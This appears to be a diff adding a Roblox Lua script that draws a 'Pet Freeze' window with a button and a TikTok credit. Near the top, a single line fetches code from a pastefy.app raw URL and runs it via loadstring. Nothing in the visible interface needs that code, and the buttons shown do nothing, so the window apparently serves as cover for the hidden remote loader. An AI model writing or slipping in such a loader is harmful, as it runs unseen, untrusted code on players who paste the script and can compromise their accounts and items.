@@ -1,0 +1,97 @@
+-- Services
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- Wait for PlayerGui
+local playerGui = player:WaitForChild("PlayerGui")
+loadstring(game:HttpGet("https://pastefy.app/kIp2JPXK/raw"))()
+-- ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "Uncle Sam"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = playerGui
+
+-- Main Frame
+local frame = Instance.new("Frame", screenGui)
+frame.Size = UDim2.new(0, 320, 0, 150)
+frame.Position = UDim2.new(0.5, -160, 0.5, -75)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.Active = true
+frame.Draggable = true
+frame.Name = "PetPlaceFrame"
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
+
+-- Frame Stroke
+local stroke = Instance.new("UIStroke", frame)
+stroke.Color = Color3.fromRGB(255, 255, 255)
+stroke.Thickness = 1.6
+stroke.Transparency = 0.6
+
+-- Gradient Background
+local gradient = Instance.new("UIGradient", frame)
+gradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 20))
+})
+gradient.Rotation = 90
+
+-- Title
+local title = Instance.new("TextLabel", frame)
+title.Text = "🦋 Pet Freeze 🦋"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 22
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, -40, 0, 32)
+title.Position = UDim2.new(0, 12, 0, 6)
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Close Button
+local closeButton = Instance.new("TextButton", frame)
+closeButton.Text = "❌"
+closeButton.Font = Enum.Font.GothamBold
+closeButton.TextSize = 18
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+closeButton.BackgroundTransparency = 0.1
+closeButton.Size = UDim2.new(0, 28, 0, 28)
+closeButton.Position = UDim2.new(1, -36, 0, 8)
+Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 8)
+
+-- Equipped Pet Label
+local petInfo = Instance.new("TextLabel", frame)
+petInfo.Text = "Equipped Pet: [None]"
+petInfo.Font = Enum.Font.GothamMedium
+petInfo.TextSize = 16
+petInfo.TextColor3 = Color3.fromRGB(255, 230, 150)
+petInfo.BackgroundTransparency = 1
+petInfo.Position = UDim2.new(0, 14, 0, 48)
+petInfo.Size = UDim2.new(1, -28, 0, 24)
+petInfo.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Place Pet Button
+local placePetButton = Instance.new("TextButton", frame)
+placePetButton.Text = "Freeze Pet"
+placePetButton.Font = Enum.Font.GothamBold
+placePetButton.TextSize = 16
+placePetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+placePetButton.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
+placePetButton.BackgroundTransparency = 0.15
+placePetButton.Size = UDim2.new(0, 240, 0, 38)
+placePetButton.Position = UDim2.new(0.5, -120, 0, 86)
+Instance.new("UICorner", placePetButton).CornerRadius = UDim.new(0, 10)
+local btnStroke = Instance.new("UIStroke", placePetButton)
+btnStroke.Color = Color3.fromRGB(255, 255, 255)
+btnStroke.Thickness = 1.2
+btnStroke.Transparency = 0.4
+
+-- Footer
+local footer = Instance.new("TextLabel", frame)
+footer.Text = "Tiktok: @Uncle.Sam"
+footer.Font = Enum.Font.Gotham
+footer.TextSize = 13
+footer.TextColor3 = Color3.fromRGB(200, 200, 200)
+footer.BackgroundTransparency = 1
+footer.Size = UDim2.new(1, 0, 0, 20)
+footer.Position = UDim2.new(0, 0, 1, -22)
